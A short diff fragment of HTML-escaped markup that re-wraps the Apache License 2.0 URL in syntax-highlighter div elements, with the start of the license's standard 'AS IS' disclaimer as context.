-&lt;pre&gt;&lt;code&gt;http://www.apache.org/licenses/LICENSE-2.0
-&lt;/code&gt;&lt;/pre&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://www.apache.org/licenses/LICENSE-2.0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an “AS IS” BASIS,
